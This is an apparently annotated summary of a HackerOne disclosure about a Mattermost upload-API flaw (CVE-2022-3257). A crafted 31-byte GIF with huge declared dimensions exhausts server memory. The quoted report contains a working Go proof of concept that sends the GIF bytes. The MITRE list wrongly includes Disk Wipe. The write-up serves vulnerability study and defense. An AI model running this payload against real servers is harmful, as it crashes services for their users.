# Denial of Service: Out of Memory from Malformed GIF Upload via Upload API

## Metadata
- **Source:** HackerOne
- **Report:** 1620170 | https://hackerone.com/reports/1620170
- **Submitted:** 2022-06-30
- **Reporter:** catenacyber
- **Program:** Mattermost
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Denial of Service (Memory Exhaustion), Improper Input Validation, Resource Exhaustion
- **CVEs:** CVE-2022-3257
- **Category:** memory-binary

## Summary
A specially crafted GIF file with maximum dimensions can be uploaded through Mattermost's upload API, causing the server to consume excessive memory (>4GB) and crash. The vulnerability exists because the upload API endpoint calls gif.DecodeAll without preprocessing/validation, unlike the /api/v4/files route which properly sanitizes images before decoding.

## Attack scenario
1. Attacker obtains valid Mattermost credentials or finds an unauthenticated upload endpoint
2. Attacker crafts a minimal GIF file with header specifying extremely large dimensions (0xfff8 x 0xffff)
3. Attacker sends the GIF through the upload API using CreateUpload and UploadData endpoints
4. gif.DecodeAll function attempts to allocate memory for the declared dimensions
5. Server allocates >4GB RAM attempting to decode the image
6. Docker container/process is killed by OS due to memory limit exceeded

## Root cause
The upload API route (uploadData → doUploadData → App.UploadData) calls GetInfoForBytes which invokes gif.DecodeAll directly without preprocessing. In contrast, the /api/v4/files route calls preprocessImage first, which validates and constrains image dimensions before decoding. This inconsistency in security controls creates a bypass.

## Attacker mindset
An attacker would recognize this as a simple DoS vector requiring minimal resources: a tiny crafted file (~31 bytes) that causes massive server-side resource consumption. This is attractive because it's reliable, hard to rate-limit (legitimate file uploads are expected), and requires only basic API access.

## Defensive takeaways
- Apply consistent input validation across all file upload endpoints - use centralized preprocessImage or similar validation
- Validate image dimensions before attempting to decode, rejecting files declaring unreasonable dimensions
- Implement resource limits on image decoding (memory timeout, maximum pixel count, maximum dimensions)
- Add rate limiting specifically for file uploads to prevent rapid DoS attempts
- Use streaming image decoders or bounded decoders that fail gracefully on resource exhaustion
- Set memory ulimits per API handler or request to prevent single request from consuming entire process memory
- Add monitoring/alerting for unusual memory consumption patterns during file uploads

## Variant hunting
Check PNG/JPEG/WebP upload endpoints for similar preprocessImage bypass
Test other media upload paths (video thumbnails, document preview generation)
Look for other gif.DecodeAll calls without dimension validation in codebase
Test large dimension values in other image formats with different decoder libraries
Check if other routes have similar inconsistent validation patterns
Test zip/archive extraction with similar directory traversal dimension tricks
Look for other Go standard library decode functions used without bounds checking

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1499 - Endpoint Denial of Service
- T1561 - Disk Wipe
- T1499.004 - Application Exhaustion Flood

## Notes
The PoC is elegant and minimal - only 31 bytes needed to trigger memory exhaustion. The GIF header (0x47 0x49 0x46 0x38 0x39 0x61) declares dimensions 0xf8ff x 0xffff. This is a classic case of inconsistent security controls and demonstrates why centralized validation is critical. The bug was likely introduced when the upload API was refactored separately from the files API.

## Full report
<details><summary>Expand</summary>

## Summary:
When sending a specially crafted gif with max dimensions through the upload API, we get Mattermost server to consume more than 4Gbytes of RAM

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Run `docker run --name mattermost-preview -d --publish 8065:8065 mattermost/mattermost-preview -m=4G` as documented https://docs.mattermost.com/guides/deployment.html with 4G limit from https://docs.mattermost.com/install/software-hardware-requirements.html#hardware-requirements-for-team-deployments
  1. Get one channel id
  1. Run this simple POC below with a valid channel id
  1. Docker container gets killed

```
package main

import (
	"bytes"
	"fmt"
	"github.com/mattermost/mattermost-server/v5/model"
)

func main() {
	Client := model.NewAPIv4Client("http://localhost:8065/")
	Client.Login("toto", "tototo")
	us := &model.UploadSession{
		ChannelId: "5dtj9hf89ifap8imigbzjc7wjo",
		Filename:  "oom.gif",
		FileSize:  31,
	}
	us, response := Client.CreateUpload(us)
	fmt.Printf("lol %s %#+v\n", us, response)
	data := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x2e, 0xf8, 0xff, 0xff, 0xf, 0x18, 0x18, 0x2c, 0x7f, 0x20, 0x0, 0x0, 0x0, 0xa0, 0xff, 0xff, 0xff, 0xd4, 0x9a, 0xf0, 0xb4, 0x8, 0x35, 0x4, 0x0}
	info, err2 := Client.UploadData(us.Id, bytes.NewReader(data))
	fmt.Printf("lol %s %#+v\n", err2, info)
}
```

This happens with `gif.DecodeAll` being called by `GetInfoForBytes` getting called by `App.UploadData` being called by `doUploadData` being called by `uploadData` without any call to `preprocessImage` as is done in the `api/v4/files` route

Docker container gets killed

## Impact

Crash a server

</details>

---
*Analysed by Claude on 2026-05-24*
